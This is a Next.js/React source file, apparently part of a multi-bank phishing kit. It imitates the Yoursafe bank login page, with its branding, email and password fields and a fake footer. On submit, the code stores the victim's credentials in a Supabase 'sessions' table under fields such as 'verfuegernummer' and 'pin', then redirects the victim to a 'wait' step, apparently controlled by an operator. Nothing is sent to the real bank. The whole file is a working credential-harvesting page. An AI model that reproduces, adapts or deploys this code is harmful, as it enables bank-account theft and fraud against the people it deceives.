"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function YoursafeClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
      form_data: { ...prev, bankSlug: "yoursafe", bankName: "Yoursafe", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    // ⭐ FLASH YOK: router.push → router.replace
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col md:flex-row">
      
      {/* Left Column - Blue Background with Illustration */}
      <div className="w-full md:w-1/2 bg-[#4AA3DF] relative min-h-[300px] md:min-h-screen overflow-hidden flex items-center justify-center">
        <img src="/bank-assets/yoursafe/sol taraf kadın .svg" alt="Woman profile" className="absolute bottom-0 h-[80%] object-contain" />
      </div>

      {/* Right Column - Form */}
      <div className="w-full md:w-1/2 flex flex-col pt-8 pb-12 px-8 sm:px-16 xl:px-32 relative">
        
        {/* Logo */}
        <div className="mb-16">
          <img src="/bank-logos/yoursafe-detail.svg" alt="Yoursafe" className="h-10" />
        </div>

        <div className="w-full max-w-[420px] mx-auto">
          <h1 className="text-[28px] font-bold text-[#1C2640] mb-2">Login to Yoursafe</h1>
          <p className="text-[14px] text-gray-600 mb-8">
            Need a Yoursafe account? <a href="#" className="text-[#2A7CD9] hover:underline">Sign up</a>
          </p>

          {/* Toggle Tabs */}
          <div className="flex p-1 bg-gray-50 rounded-full mb-8 border border-gray-200">
            <button className="flex-1 text-[13px] font-medium text-gray-500 py-2 rounded-full hover:text-gray-800 transition-colors">
              QR code Login
            </button>
            <button className="flex-1 text-[13px] font-medium text-gray-800 bg-white py-2 rounded-full shadow-sm border border-gray-100 transition-colors">
              Email Login
            </button>
          </div>

          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-6">
            
            <div>
              <label className="block text-[13px] text-gray-500 mb-2">Email *</label>
              <input 
                type="email" 
                value={username} 
                onChange={e => setUsername(e.target.value)} 
                className="w-full bg-[#F5F6F8] border border-transparent rounded-[4px] py-3 px-4 text-[15px] focus:outline-none focus:bg-white focus:border-[#2A7CD9] transition-all text-[#1C2640]" 
              />
            </div>

            <div>
              <label className="block text-[13px] text-gray-500 mb-2">Password *</label>
              <div className="relative">
                <input 
                  type="password" 
                  value={password} 
                  onChange={e => setPassword(e.target.value)} 
                  className="w-full bg-[#F5F6F8] border border-transparent rounded-[4px] py-3 px-4 pr-12 text-[15px] focus:outline-none focus:bg-white focus:border-[#2A7CD9] transition-all text-[#1C2640]" 
                  placeholder="Password"
                />
                <button type="button" className="absolute right-4 top-[14px] text-gray-400 hover:text-gray-600">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path></svg>
                </button>
              </div>
            </div>

            <div className="pt-2">
              <a href="#" className="text-[14px] font-medium text-[#2A7CD9] hover:underline">Forgot your password?</a>
            </div>

            <button 
              type="submit" 
              disabled={saving || !username || !password} 
              className="w-full bg-[#2A7CD9] text-white font-medium py-3 rounded-[4px] hover:bg-[#2069BD] disabled:opacity-50 transition-colors mt-2"
            >
              {saving ? "Logging in..." : "Log in"}
            </button>
          </form>

        </div>

        {/* Footer */}
        <div className="mt-auto pt-16 w-full max-w-[420px] mx-auto text-center">
          <p className="text-[12px] text-gray-500 mb-2">All rights reserved — © 2026 Yoursafe. Netherlands</p>
          <div className="flex justify-center gap-4 text-[12px] text-[#2A7CD9]">
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Terms & conditions</a>
            <a href="#" className="hover:underline">Contact us</a>
          </div>
        </div>

      </div>
    </div>
  );
}